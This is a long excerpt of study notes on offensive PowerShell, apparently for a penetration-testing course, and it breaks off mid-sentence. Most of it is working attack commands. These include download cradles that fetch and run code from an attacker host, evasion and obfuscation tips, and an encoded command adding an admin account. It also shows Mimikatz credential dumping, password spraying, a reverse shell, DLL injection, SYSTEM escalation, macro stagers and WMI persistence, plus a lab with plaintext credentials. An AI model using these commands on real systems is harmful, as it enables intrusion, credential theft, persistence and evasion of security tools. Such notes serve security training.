        "excerpt":"  Fundamentals   Some Tools:   → https://github.com/PowerShellMafia/PowerSploit    → https://github.com/powershell/powershell   The Powershell CLI  CLI = Command Line Interface      powershell path    \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Windows PowerShell\\&lt;v1.0 = version&gt;\"   [Environment]::Is64BitProcess True   64-bit PowerShell:  C:\\wIndows\\system32\\WindowsPowerShell   32-bit PowerShell:  C:\\windows\\SysWOW64\\WindowsPowerShell   Help Parameter  /?  -Help -?   Basic Usage     ExecutionPolicy determines which scripts if any, we can run and can easily be disabled with the “Bypass” or “Unrestricted” arguments   powershell.exe -ExecutionPolicy Bypass .\\script.ps1 powershell.exe -ExecutionPolicy Unrestricted .\\script,ps1   -WindowStyle Hides the Powershell window when used the “hidden” argument   powershell.exe -WindowStyle Hidden .\\script.ps1   -Command Is used to specify a Command or Script Block to run.   powershell.exe -Command Get-Process powershell.exe -Command \"&amp; { Get-EventLog -LogName security } \"   -EncodedCommand is used to execute base64 encoded scripts or commands   powershell.exe -EncodedCommand $encodedCommand   -NoProfile Dont load any powershell profiles Profiles are essentially scripts that run when the powershell executable is launched and can interfere with our operations.   powershell.exe -NoProfile .\\script.ps1   -Version we can use followed by a version number as the argument to downgrade the version of powershell Useful in scenarios where you have landed on a machine with a more recent version and need to downgrade to Version 1.0 or 2.0 to complete certain tasks.   → Requires that older versions are still installed on the target   powershell.exe -Version 2   Abreviations  -ExecutionPolicy = -ep / -ex -EncodedCommand = -ec / -enco -WindowStyle Hidden = -W h / -Wi hi   Get-Help  Similar to linux Man Pages we can use to obtain information related to any function, alias, module or cmdlet that PowerShell is aware of.   To get full help For any cmdlet, which includes detailed information on associated parameters  Get-Help Get-Process -Full   To show examples of a specific cmdlet  Get-Help Get-Process -Examples   To show Help pages online  Get-Help Get-Help -Online   To update the help files  Update-Help   → https://technet.microsoft.com/en-us/library/cc764318.aspx   Get-Command  it allows us to list all cmdlets, aliases, functions, workflows, filters, scripts and any applications that are available For us to use in PowerShell.  Get-Command -Name *Firewall*   Cmdlets  Command-lets its how we will leverage powershell For our offensive purposes cmdlets are native commands in powershell (we can also create our own)   Typically used to return output to other cmdlets to be then processed via a pipeline (“|”) \thttps://www.petri.com/understanding-the-powershell-pipeline   Get-ChildItem   Returns 4 columns names Mode, LastWriteTime, Length and Name. But we can pipe the output  Get-ChildItem | Format-List *      rather than columns and names  as seen in the previous slide, we can return all named properties associated with its objects in a different list-like format    Pipelining  results of all cmdlets output = objects   Get-Process | Sort-Object -Unique | Select-Object ProcessName   like linux we can redirect the output to a file:  Get-Process | Sort-Object -Unique | Select-Object ProcessName &gt; file.txt   Useful Cmdlets &amp; Usage  -Get-Process   list of all processes formatted in a table-like format   Get-Process | Format-List *   To get all of the information (properties) associated with all of the processes   Get-Process chrome, firefox | Sort-Object -Unique | Format-List Path   Further extend to get information about specific processes and paths to their executables   Get-Process chrome, firefox | Sort-Object -Unique | Format-List Path, Id      append another property (id)   Alias  Most of the cmdlets have Aliases.  example:  Get-ChildItem = list items in a directory = ls (exactly like the linux one)   To find the aliases we can use: Get-Alias  Get-Alias -Definition Get-ChildItem   // dir // gci // ls   Get-WmiObject   Get-WmiObject -class win32_operatingsystem | select -Property *   Get-WmiObject -class win32_operatingsystem | fl *     using the Format-List alias “fl”   Get-WmiObject -class win32_service | fl *   detailed list of properties For all services   Get-WmiObject -class win32_service | Sort-Object -Unique PathName | fl PathName   expanding the filter with PathName   Export-Csv  saving the information that we are gathering to a file we can redirect operator (&gt;)  Get-WmiObject -class win32_operatingsystem | fl * | Export-Csv C:\\file.csv   // to save to CSV format   Exploring the Registry   cd HKLM:\\ // cd is the alias For the Set-Location cd .\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ ls   Select-String   Select-String -Path C:\\users\\user\\Documents\\*.txt -Pattern pass*   // search For .txt files named pass* in a directory   Get-Content  we can use to display the full content of the file   Get-Content C:\\Users\\user\\Documents\\passwords.txt  ls -r C:\\users\\user\\Documents -File *.txt | % {sls -Path $_ -Pattern pass* } ls -r = alias For \"Get-ChildItem\" % = alias For \"ForEach-Object\" sls = alias For \"Select-String\" $_ = variable For current value in the pipeline    Get-Service  Get us information regarding currently installed services and can be useful in the case we can identify a service which might be vulnerable to a privilege escalation exploit.  Get-Service \"s*\" | Sort-Object Status -Descending   // all services that start with \"s\"   Modules      Is a set of powershell functionalities grouped together in the form of a single file that will typically have a “.psm1” file extension.   The components that can make up a module:  powershell scripts (.ps1) additional assemblies, help files or scripts module manifest file directory which is used to contain all of the above   Types  script modules:   → https://docs.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-script-module?view=powershell-7 binary modules:    → https://docs.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-binary-module?view=powershell-7 manifest modules:    → https://docs.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-module-manifest?view=powershell-7 dynamic modules:     → http://go.microsoft.com/fwlink/?LinkId=141554   Get-Module  to obtain a list of all currently imported modules  Get-Module   To list all modules available to us  Get-Module -ListAvailable   Import-Module  modules that we want to use, will first need to be imported into our current powershell session  Import-Module .\\module.psm1      After importing, all cmdlets of that module is available to us      [+] example PowerSploit = https://github.com/PowerShellMafia/PowerSploit    1 - download the module 2 - we need to copy to one of the module paths specified by the $Env:PSModulePath.   $Env:PSModulePath // to find these paths      Perhaps the AV will detect the powersploit framework as malicious. its normal. In this case create an exclude directory For your AV software.    3 - extract and copy all of its contents into our chosen module directory into a folder called ‘PowerSploit’ 4 - Import the module   Import-Module PowerSploit Get-Module   5 - To list all the commands For that module   Get-Command -Module PowerSploit   6 - There are help files For all of the modules   Get-Help Write-HihackDLL   Scripts   .\\example.ps1   Param{ \t[parameter(mandatory=$true)][string]$file } Get-Content \"$file\"      this script takes a file name as argument For which it creates a variable called “$file”, and runs the “Get-Content” cmdlet on our variable.    .\\example1.ps1 users.txt // users.txt contains several usernames, so the script will return the content of the file   Alternatively  \t$file=\"users.txt\" \tGet-Content $file      create a variable with the file, then just run getcontent with that variable    Loops Statements  \tfor() \tforeach() \twhile() \tdo{something}while() \tdo{something}until()   To get more information  Get-Help about_&lt;Foreach, For, Do or While&gt;   Loop Statement / Loop Body  \t$services = Get-Service \tforeach ($service in $services) {$service.name}      returns the name of each service with the .name property in the loop body.    Alternatively  \tGet-Service | ForEach-Object {$_.name}   using the built-in cmdlets ForEach_Object   Where-Object  allows us to select objects within a collection based on their property values in regard to when used For a loop.   Get-ChildItem C:\\Powershell\\ | Where-Object {$_.name -match \"xls\"}   Port scan example [+]   $ports=(444,81); $ip=\"192.168.13.250\";  foreach ($port in $ports) {try{$socket=New-Object System.Net.Sockets.TcpClient($ip, $port);}  catch{};  \tif ($socket -eq $null) {echo $ip\":\"$port\" - Closed\";\t} else {echo $ip\":\"$port\" - Open\";$socket = $null;}}  .\\Scan-Ports.ps1    Objects  Get-Process Format-List *      Each objects has a multiple methods that we can use to manipulate a particular object.   To get a list of methods For objects associated with a cmdlet, we can use get-member   Get-Process | Get-Member -MemberType Method      we have identified an object (in this case, a process firefox) we would like to manipulate in some way using the Get-Process cmdlet   We have determined the methods that are available For use with the objects that were returned by using:     Get-Process | Get-Member cmdlet and pipeline           We have decided that the Kill method is the method we would like to use For that process( as an example)   Get-Process -Name \"firefox\" | Kill      we can call the get-process along with the -Name parameter For the firefox process, and pipe the Kill method that we identified using the get-member cmdlet. This command will kill any firefox processes.    Creating .NET objects  As an example of creating a basic object based off of a .NET class with the “Net-Object” cmdlet, we can use the “Net.WebClient” .NET system class to download a file to a target system with the following code:    $webclient = New-Object System.Net.WebClient $payload_url = \"https://&lt;kali ip&gt;/payload.exe\" $file = \"C:\\ProgramData\\payload.exe\" $webclient.DownloadFile($payload_url, $file)       explainning the code - line by line      We create a variable called $webclient which instantiates the System.Net.WebClient .NET class, which is used to create a web client.   We then create another variable $payload_url, which is the url to our payload   The $file variable is then used as the location to which we want to save the payload on the target system   And finally, we call the $webclient variable with the DownloadFile method which downloads our payload.exe to the target.   Offensive PowerShell   Downloading and Execution      A summary of methods we can use For In-Memory execution with PowerShell 2.0:   Net.WebClient DownloadString Method Net.WebClient DownloadData Method Net.WebClient OpenRead Method .NET [Net.HttpWebRequest] class Word.Application COM Object Excel.Application COM Object InternetExplorer.Application COM Object MsXml2.ServerXmlHttp COM Object Certutil.exe w/ -ping argument      A summary of methods we can use For Disk-Based execution with PowerShell 2.0:   Net.WebClient DownloadFile method BITSAdmin.exe Certutil.exe w/ -urlcache argument      These two methods are commonly referred to as Download Cradles    From the PowerShell console  iex (New-Object Net.WebClient).DownloadString(\"http://&lt;kali ip&gt;/script.ps1\")   //iex = Invoke-Expression   From the cmd.exe  we can run the same command from a stardard windows command prompt:   powershell.exe iex (New-Object Net.WebClient).DownloadString('http://&lt;kali ip&gt;/script.ps1')  powershell.exe iex (New-Object Net.WebClient).DownloadString(\"http://10.90.60.80:5923/winpeas.exe\") \t//note that when executed within cmd.exe we need to use single quotes   Net.WebClient DownloadString Method   $downloader = New-Object System.Net.WebClient $payload = \"http://&lt;kali ip&gt;/script.ps1\" $command = $downloader.DownloadString($payload) Invoke-Expression $command    Instantiate our System.Net.WebClient class as the $downloader variable Create our $payload variable (URL to the script) Create our $command variable Execute our $command with the Invoke-Expression (iex) cmdlet   Example - Download String  save in Get-ProcessPaths.ps1  Get-Process | Format-List -Property Name, Path   Host in a web server Then:  iex (New-Object Net.WebClient).DownloadString(\"http://&lt;kali ip&gt;/Get-ProcessPaths.ps1\")      The DownloadString method will execute our remote script in the PowerShell process memory, so in regard to not dropping an artifact to disk, its a great way to stay under the radar of endpoint security solutions that are not monitoring powershell memory.      Evasion Tips [+] It should be noted that where possible when hosting your remote PowerShell script, to have an SSL certificate configured on the attacker machine. This helps in evading over-the-wire heuristics as our traffic will go over HTTPS. In the previous examples, we simply used HTTP, which could easily be detected.       Evasion Tips [+] Another trick we can use which might help in evading basic file extension heuristics is to give our Powershell script a different extension, For instance Logo.gif. PowerShell will still execute it as a .ps1 script    iex (New-Object Net.WebClient).DownloadString(\"http://&lt;kali ip&gt;/Logo.gif\")      Evasion Tips [+] Net.WebClient class allows us to specify a custom user-agent string when sending the request to our attacker URL. This can help us evade detection mechanisms that are flagging on abnormal user-agent strings crossing the wire. We can do that with the Headers.Add method:     $downloader.Headers.Add(\"user-agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36\") \t// we can insert that in the second line of our code. Just after declaring the $downloader variable    Example - DownloadFile  This method will download your executable to disk Although noisy and not recommended if trying to remain stealthy, its still sometimes a handy method to quickly download a file to the target system.    $downloader = New-Object System.Net.WebClient $payload = \"http://&lt;kali ip&gt;/payload.exe\" $local_file = \"C:\\programdata\\payload.exe\" $downloader.DownloadFile($payload, $local_file)    Instantiate our System.Net.WebClient class as the $downloader variable payload URL variable local_file variable (will save to this location) Call the object variable with the “DownloadFile” method and our $payload and $local_file variables      Executing the file once its on our target system can be accomplished using the call operator (&amp;) and variable we created For the payload ($local_file)   &amp; $local_file   [+]  We can configure the Net.WebClient class methods to use the systems proxy and default credentials   $downloader = New-Object System.Net.WebClient $payload = http://&lt;kali ip&gt;/script.ps1 $cmd = $downloader.DownloadFile($payload)  $proxy = [Net.WebRequest]::GetSystemWebProxy() $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials $downloader.Proxy = $proxy  iex $cmd    Net.WebRequest  To download and execute scripts on a target, in memory   $req = [System.Net.WebRequest]::Create(\"http://&lt;kali ip&gt;/script.ps1\") $res = $req.GetResponse() iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()    Instantiate our System.Net.WebRequest class as the $req variable Create a $res variable to store the WebRequest response Use the “Invoke-Expression” alias (iex) to invoke the System.IO.StreamReader and execute our code      It can also be configured to use a proxy we can add this before the iex line     $proxy = [Net.WebRequest]::GetSystemWebProxy() $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials $req.Proxy = $proxy   System.Xml.XmlDocument  Allow us to execute a powershell command or any system command (in memory)   Create a XML file: &lt;?xml version=\"1.0\"?&gt; &lt;command&gt; \t&lt;a&gt; \t\t&lt;execute&gt;Get-Process&lt;/execute&gt; \t&lt;/a&gt; &lt;/command&gt;    once our xml file is hosted   $xmldoc = New-Object System.Xml.XmlDocument $xmldoc.Load(\"http://&lt;kali ip&gt;/file.xml\") iex $xmldoc.command.a.execute    COM Objects  some available   Msxml2.XMLHTTP Microsoft.XMLHTTP InternetExplorer.Application Excel.Application Word.Application MsXml2.ServerXmlHttp WinHttp.WinHttpRequest.5.1 (Not Proxy Aware)      it works the same but the New-Object, with -ComObject parameter     $downloader = New-Object -ComObject Msxml12.XMLHTTP $downloader.open(\"GET\", \"http://&lt;kali ip&gt;/script.ps1\", $false) $download.send() iex $downloader.responseText      We can do the same with WinHttp.WinHttpRequest.5.1 object as well (in the first line)    $downloader = New-Object -ComObject WinHttp.WinHttpRequest.5.1      Tip [+] We can use all these commands as one liners, by using a semicolon (;) to break ip the commands We can save as script too and execute with powershell.exe .\\script.ps1  Make sure to include -ExecutionPolicy (-ep) and -Window Hidden (-W h) This will ensure we can run our scripts and that the powershell window stays hidden from the end-user    powershell.exe -ExecutionPolicy bypass -Window hidden .\\downloader.ps1      [ extra ] A great tool to craft obfuscated download cradles:    Invoke-CradleCrafter = https://github.com/danielbohannon/Invoke-CradleCrafter   Obfuscation   Invoke-Obfuscation = https://github.com/danielbohannon/Invoke-Obfuscation   - First download - Then, find the modules paths    → $env:PSModulePath \t// in this case C:\\users\\user\\Documents\\WindowsPowerShell\\Modules \t// After extract to this folder - Import the module    → Import-Module Invoke-Obfuscation - Open it    → Invoke-Obfuscation   We have several options  TOKEN AST STRING ENCODING COMPRESS LAUNCHER   SET SCRIPTBLOCK   As an example of a script block we can use a standard Net.WebClient download cradle:  SET SCRIPTBLOCK iex (New-Object Net.WebClient).downloadstring(\"http://&lt;kali ip&gt;/Get-ProcessPath.ps1\")   Type of Obfuscation   STRING   We are presented with several options For that method: \t1. Concatenate \t2. Reorder \t3. Reverse   In this example 3 → 3      we should get a code obfuscated that we can use in the target machine    Encoding   // We are presented with options     Encode as ASCII   Encode as Hex   Encode as Octal   Encode as Binary   Encrypt as SecureString (AES)   Encode as BXOR   Encode as Special Characters   Encode as Whitespace      Lets pick 7 - Special Characters, For this example  → 7   we should get a highly obfuscated payload      [+] If we are operating from a windows command prompt on the target, instead of powershell. We can use:    powershell -Command \"&lt;the same payload&gt;\"  // dont forget the quotes in the payloads      If you wanna use another encoding method, use the RESET options to clear previous methods.    Obfuscated launcher  → LAUNCHER there is a lot of options:   ps cmd wmic rundll var+ stdin+ clip+ var++ stdin++ clip++ rundll++ mshta++      We SET SCRIPTBLOCK with the code we want to execute   We select an obfuscation method to generate the obfuscated command   We then use the LAUNCHER option at the end of this process   in this case we will choose  → RUNDLL   then option 0 - No execution flags → 0   The resulting string, is an obfuscated command that utilizes rundll32.exe with the “SHELL32.DLL” function (ShellExec_RunDLL) which will launch our obfuscated powershell code on the target.      [+] There is an option: tutorial that we can use to get some guidance if we are stuck    Encoded Commands  its not recommended since it can be easily detected by AV and other string heuristics, considering its just a base64 encoding.   -EncodedCommand parameter in powershell \tit makes complex commands digestible by powershell by encoding everything with Base64.   example   $command = 'net user admin1 \"password\" /ADD; net localgroup administrators admin1 /add' $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes)    we can get the results of our encoded command with:  → Write-Host $encodedCommand   //copy the payload   then execute on the target:  powershell.exe -encodedcommand &lt;paste the payload&gt;   Information Gathering &amp; Recon   Invoke-Portscan = https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1 its included with the powersploit framework  Invoke-Portscan -Hosts \"192.168.13.1/24\" -PingOnly Invoke-Portscan -HostFile ips.txt -PingOnly      to save the results we can pipe and export-csv     Invoke-Portscan -HostFile ips.txt -PingOnly | Export-Csv C:\\ping_scan.csv           once we have identified live hosts we can conduct port scans  Invoke-Portscan -HostFile ips.txt -ports \"53-81\"   Output to .gnmap = NMAP format  Invoke-Portscan -HostFile ips.txt -oG port_scan.gnmap -f -ports \"1-81\"   For enumerating Files   Get-HttpStatus  Get-HttpStatus -Target 192.168.13.62 -Path dictionary.txt -Port 80 | ? {$_.Status -match \"ok\"}   Host Discovery with Posh-SecMod framework  Invoke-ARPScan = https://github.com/darkoperator/Posh-SecMod   it may generate fewer alerts than your usual SYN or TCP scan  Invoke-ARPScan -CIDR 192.168.13.1/24   Get-Command -Module Posh-SecMod // to view the available options   DNS related  Invoke-ReverseDnsLookup -CIDR 192.168.13.0/24 Get-Help Resolve-HostRecord -Examples Get-Help Resolve-DNSRecord -Examples   Post-Exploitation with PowerShell   post-exploitation framework Nishang = https://github.com/samratashok/nishang   // as always, download the framework and host with a web server      Nishang   Copy-VSS module  will attempt to copy the SAM database using VSS service, and if run on a domain controller, will try and copy the NTDS.dit and contents of the system registry hive.   iex (New-Object Net.WebClient).DownloadString(\"http://&lt;kali ip&gt;/Copy-VSS.ps1\"); Copy-VSS   Get-Information  get a lot of system information   iex (New-Object Net.WebClient).DownloadString(\"http://&lt;kali ip&gt;/Get-Information.ps1\"); Get-Information   Get-PassHints  we can use to dump the saved password hints For users on the system:   iex (New-Object Net.WebClient).DownloadString(\"http://&lt;kali ip&gt;/Get-PassHints.ps1\"); Get-PassHints   Invoke-Mimikatz  Will dump clear-text credentials or hashes from memory.   iex (New-Object Net.WebClient).DownloadString(\"http://&lt;kali ip&gt;/Invoke-Mimikatz.ps1\"); Invoke-Mimikatz -DumpCreds      There is plenty more in Nishang gather modules moreover = https://github.com/samratashok/nishang#gather    Invoke-BruteForce  We can use this to brute force Active Directory accounts, SQL Server, Web or FTP servers. Invoke-BruteForce is great tool For executing a password spray attack against Active Directory Just ensure that your password list contains a single password.   → Get-Help Invoke-BruteForce   Invoke-BruteForce -ComputerName targetdomain.com -UserList C:\\temp\\users.txt -PasswordList C:\\temp\\pwds.txt -Service ActiveDirectory -StopOnSuccess -Verbose   Reverse Shell - Invoke-PowerShellTcp  provides a way to obtain a reverse PowerShell from our target host back to a netcat listener the traffic is traversing the wire in cleartext between attacker and target. although a great and undetected by AV method to get a reverse shell from PowerShell, over-the-wire (SIEM) may pick up some chatter if that type of solution has been implemented within an organization.      Open a listener in the attacker:   nc -lvnp 4444     Execute the command in the target to grab the file and get the reverse shell:   powershell.exe -Command iex (New-Object Net.WebClient).DownloadString(\"http://&lt;kali ip&gt;/Invoke-PowerShellTcp.ps1\"); Invoke-PowerShellTcp -Reverse -IPAddress &lt;kali ip&gt; -Port 4444      There is a lot more shells available in Nishang framework. // bind, reverse, ICMP, UDP, RAT, etc     Invoke-JSRatRegsvr.ps1 Invoke-JSRatRundll.ps1 Invoke-PoshRatHttp.ps1 Invoke-PoshRatHttps.ps1 Invoke-PowerShellIcmp.ps1 Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcpOneLine.ps1 Invoke-PowerShellTcpOneLineBind.ps1 Invoke-PowerShellUdp.ps1 Invoke-PowerShellUdpOneLine.ps1 Invoke-PsGcat.ps1 Invoke-PsGcatAgent.ps1 Remove-PoshRat.ps1           Nishang has other categories modules as well:   ActiveDirectory Antak-WebShell Backdoors Bypass Client Escalation Execution Gather MITM Misc Pivot Prasadhak Scan Shells Utility      PowerSploit   Tools For post-exploitation:  AntivirusBypass Code Execution Exfiltration Mayhem Persistence Privesc Recon ScriptModification   PowerUp  its a module within the Privesc Category we can first import the Privesc module from within the Privesc modules directory and have a look at some of the options we have:   C:\\Modules\\PowerSploit\\Privesc&gt; Import-Module .\\Privesc.psm1 Get-Command -Module Privesc      Invoke-AllChecks: // will run all functions related to the Privesc module looking For misconfigurations, permissions issues with services, opportunities For DLL hijacking a number of other useful checks.   // We can invoke it on the target after we have imported the Privesc.psm1 module with the “Invoke-AllChecks” command.   C:\\Modules\\PowerSploit\\Privesc&gt; Invoke-AllChecks   The output will also indicate an AbuseFunction we can use to further exploit the target.  In this case, PowerUp identified a potential service binary we can install with the “Install-ServiceBinary -Name ‘ClickToRunSvc’ command”   PowerSploit - Save to HTML  the file will be saved in the current directory MACHINENAME.USERNAME.html  Invoke-AllChecks - HTMLReport   CodeInjection category  we can inject our own code into existing processes on the target system, whether it be via DLL injection, injecting our own custom Shellcode into an existing process, or using WMI to execute commands on the target.   Invoke-DLLInjection  this function injects an attacker-defined DLL into any existing process ID on the target system.   msfvenom -p windows/exec CMD=\"cmd.exe\" -f dll &gt; cmd.dll   open a web host: grab the file:  iex (New-Object Net.Webclient).DownloadFile('http://&lt;kali ip&gt;/cmd.dll', 'C:\\programdata\\cmd.dll')      Identify a process on the target system we would like to inject our DLL into.   ps | ? {$_.ProcessName -match \"notepad\"}      After grabbing the PID of the choosen process We can grab the Invoke-DLLInjection and execute it to inject our malicious dll in the PID of the process   iex (New-Object Net.Webclient).DownloadString('http://&lt;kali ip&gt;/Invoke-DLLInjection.ps1'); Invoke-DLLInjection -ProcessID 7420 C:\\programdata\\cmd.dll      once that in complete, we can run “ps” command again, to confirm that we have a “cmd” process which has been spawned from our DLL injection operation, which is created in a new process thread.   ps | ? {$_.ProcessName -match \"cmd\"}   More about DLL injection  http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html      psgetsystem   // another tool   https://github.com/decoder-it/psgetsystem   psgetsystem allows us to get SYSTEM privileges via a parent process, which then spawns a child process which effectively inherits the SYSTEM access privileges of the parent. Although this tool needs to be run as Administrator, its a great way to evade application whitelisting solutions by being to inject ourselves into an already signed or other trusted process.   After send the script to the target  \t. .\\psgetsys.ps1 \t[MyProcess]::CreateProcessFromParent(&lt;system_id&gt;, \"&lt;Command to execute&gt;\")      First we need to identify some SYSTEM processes   Get-Process -IncludeUserName | Where-Object {$_.UserName -match \"SYSTEM\"} | Format-List -Property Username,Name,Id   This should return a list of all SYSTEM-owned processes along with their PIDs and process names. in this case we will use ZeroConfigService      This will launch a cmd.exe prompt, but as a child process of the SYSTEM-owned ZeroConfigService.exe process, and as a result, our child process, will also be SYSTEM.   \t. .\\psgetsys.ps1 \t[MyProcess]::CreateProcessFromParent(3632,\"cmd.exe\")      we can confirm this by running a tool like Process Explorer, to see that our cmd.exe process has been spawned as a child process of the ZeroConfigService process and is also SYSTEM.       of course, in an attack scenario, we could launch a meterpreter executable payload as SYSTEM and get a SYSTEM shell from the target machine.            Empire       https://github.com/EmpireProject/Empire          Another post-exploitation framework Its main advantage is that is implements powershell functionality without requiring the existence of powershell on a target machine.    Powershell and Metasploit   set a handler in meterpreter make a payload in msfvenom = -f psh-reflection &gt; payload.ps1 make a web host to send the payload to the target  \tpython -m http.server   grab the file in the target machine:  powershell iex (New-Object Net.Webclient).DownloadString('http://&lt;kali ip&gt;/payload.ps1')      once we execute the download cradle, we will receive the meterpreter session already    in meterpreter session:   load powershell help = to show the options we have powershell_shell   Get-Process | Where-Object {$_.ProcessName -match \"iTunes\"}   back to meterpreter:  powershell_execute 'iex (New-Object Net.Webclient).downloadstring(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1\"); Invoke-Mimikatz'      it has the advantage that operates in the powershell memory, helping us to stay undetected.    sending Empire session to Metasploit  in msfconsole: \texploit/multi/script/web_delivery \tset srvhost = kali ip \tset lhost = kali ip \tset target 2 = PSH *powershell \trun \tcopy the URL of the payload   in Empire: \tusemodule powershell/cpde_execution/invoke_metasploitpayload \tinfo \tset URL  \tset Agent 65CY4XEG \texecute \t// Now it should open a session in metasploit   Empire Overview   Install     https://github.com/EmpireProject/Empire   git clone &lt;url&gt; cd Empire &gt; cd setup &gt; ./install.sh   Handlers  listeners help uselistener userlistener &lt;option of choice&gt; info = to show options   config to use SSL  cd /root/tools/Empire/setup/ ./cert.sh   in Empire: set CertPath /root/tools/Empire/data execute = run/exploit (metasploit) back = same as (metasploit)   BindIP = lhost (metasploit) Port = lport (metasploit)      Verify listeners now our listener should appear   set Stager  usestager = it will show the options usestager multi/launcher info = to show options set Listener http execute copy the payload to execute in the target machine   Agents  After executing the payload in the target, we should have an agent in Empire = same as session in metasploit   agents = it will show the open session help interact &lt;tab&gt; choose an option = same as session -i &lt;number&gt; (metasploit)   In Empire Session  help = always to show the available options info = same as sysinfo (metasploit) shell = to use commands  shell whoami shell whoami /GROUPS usemodule searchmodule checks  usemodule privesc/powerup/allchecks execute   Client side attack  main = to come back to the main menu usestager windows/macro info set Listener http set OutFile root/tools/Empire/data/macro execute    the macro code will be save in that directory we can copy-paste the macro to a word document make sure that you enable developer tab For your version of microsoft word alt+f11 = to open the visual basic  copy the payload to the editor save the file .doc      as the result of the macro execution in the target machine, we get a session in Empire    UAC Bypass PowerShell Exploit Script Walkthrough      Identify the program that which auto elevates to a high integrity process, which naturally bypass UAC in a sense.   Identify that the program checks For registry keys and values which are writable by us   and its responsable to associate file types of the msi extension to a specific application   we also hijack that process, to launch a command of our choosen, which was the calculator program.   Introduction to Leveraging WMI and Methods For Persistence  Get-WmiObject Get-Help Get-WmiObject Get-Help wmi  Get-WmiObject -Namespace \"root/cimv2\" -Class \"__Namespace\" Get-WmiObject -Namespace \"root/cimv2\" -Class \"__Namespace\" | Select-Object Name Get-WmiObject -Namespace \"root/cimv2\" -List | Where-Object {$_.Name -Match \"Win32_Service\"} Get-WmiObject -Class Win32_Service | Where-Object {$_.State -Match \"Running\"} Get-WmiObject -Class Win32_Service | Where-Object {$_.Name -Match \"Defend\"} Get-WmiObject -Class Win32_Process -List Get-WmiObject -List Win32_Process | Get-Member -Membertyoe Method    $proc = Get-WmiObject -List Win32_Process $proc.Create(\"cmd.exe\")       this should launch cmd.exe as a child process from WmiProvider    Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList cmd.exe   // Also will generate a process as a child from the WmiProvider   Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList cmd.exe -ComputerName &lt;ip&gt; -Credential &lt;user&gt;   Get-WmiObject -Class Win32_Process -Filter {ProcessId =\"2512\"} -Computername &lt;ip&gt; -Credential &lt;user&gt;   Get-WmiObject -Class Win32_Process -Filter {ProcessId =\"2512\"} -Computername &lt;ip&gt; -Credential &lt;user&gt; | Remove-WmiObject   // if we want to kill the process remotely   PowerLurk  https://github.com/Sw4mpf0x/PowerLurk      make a payload in msfvenom   send to the target machine via python web server host   open a handler in metasploit   download the PowerLurk.ps1 from github   execute this command to grab the PowerLurk file and trigger with a program, in this case the calc.exe.  // Everytime the target execute the calculator our payload will be executed.   iex (New-Object Net.WebClient).DownloadString('http://&lt;kali ip&gt;/PowerLurk.ps1'); Register-MaliciousWmiEvent -EventName CalcExec -PermanentCommand \"cmd.exe /c C:\\programdata\\payload.exe\" -Trigger ProcessStart -ProcessName calc.exe      To view our malicious WMI Event   iex (New-Object Net.WebClient).DownloadString('http://&lt;kali ip&gt;/PowerLurk.ps1'); Get-WmiEvent -Name CalcExec      now its up to the target user, to open the calculator  it will trigger the reverse shell back to our kali    if you wanna Remove the Malicious WMI Event  iex (New-Object Net.WebClient).DownloadString('http://&lt;kali ip&gt;/PowerLurk,ps1'); Get-WmiEvent -Name CalcExec | Remove-WmiObject   Lab 1 - Leveraging PowerShell During Exploitation   organization - 172.16.80.0/24 172.16.80.1 172.16.80.100 tester ip = 175.12.80.0/24   # my ip 175.12.80.10 # 172.16.80.1 172.16.80.100 \t135 \t139 \t445 \t4983      we can access in browser or by nc     172.16.80.100:4983 or nc 172.16.80.100 4983 @echo off  net use \"\\\\10.100.11.150\\C$\" /user:local_admin P@ssw0rd123  if exist \"\\\\10.100.11.150\\C$\\Program_Files\\MSBuild\\ErrorLog.txt\" (      echo \"Copying errors...\"      copy \"\\\\10.100.11.150\\C$\\Program_Files\\MSBuild\\ErrorLog.txt\" C:\\Users\\local_admin\\Logs\\Host1\\      del \"\\\\10.100.11.150\\C$\\Program_Files\\MSBuild\\ErrorLog.txt\" ) else (      echo \"No errors!\" )  net use \"\\\\10.100.11.150\\C$\" /delete       we discovered a new ip and credentials   10.100.11.150 local_admin:P@ssw0rd123      now that we have credentials, lets smbexec into it    john㉿kali)-[/opt/impacket/examples] └─$ sudo python3 smbexec.py 'local_admin:P@ssw0rd123'@172.16.80.100   \tipconfig \techo %userdomain%    powershell -c iex (New-Object Net.WebClient).DownloadFile('http://10.100.11.101:8000/payload2.exe', 'C:\\Windows\\Temp\\payload.exe')      after some time configuring Empire   sudo powershell-empire server sudo powershell-empire client   in Empire:  listeners uselistener http info set Host  execute main   usestager multi/launcher set listener http execute   copy the payload and execute into the first shell from smbexec // we should get a shell back from Empire = they call this agent   agents interact  // its the same as session -i  from Metasploit   usemodule situation_awareness/network/arpscan set CIDR 10.100.11.0/24 set Agent  execute      we discovered 2 hosts: 100 e 101   \tMAC               Address       ---               -------       00:50:56:A0:4F:BC 10.100.11.1   00:50:56:A0:13:FF 10.100.11.100 00:50:56:A0:53:98 10.100.11.101 00:50:56:A0:53:98 10.100.11.255   now lets search for open ports  usemodule powershell/situational_awareness/network/portscan set Hosts 10.100.11.100 = ip of the target found set Agent  execute   Hostname      OpenPorts        --------      ---------        10.100.11.100 445,139,135,8443   Passing the session to Metasploit, because we will need to do some Pivot  In Metasploit:  use exploit/multi/script/web_delivery set target 2 = powershell set SRVHOST &lt;kali ip&gt; set payload windows/meterpreter/reverse_tcp set lhost &lt;kali ip&gt; exploit -j copy the URL   in Empire:  usemodule code_execution/invoke_metasploitpayload set URL &lt;the URL from metasploit module&gt; set Agent &lt;agent number&gt; execute      here, we should get a meterpreter session    in Metasploit: we 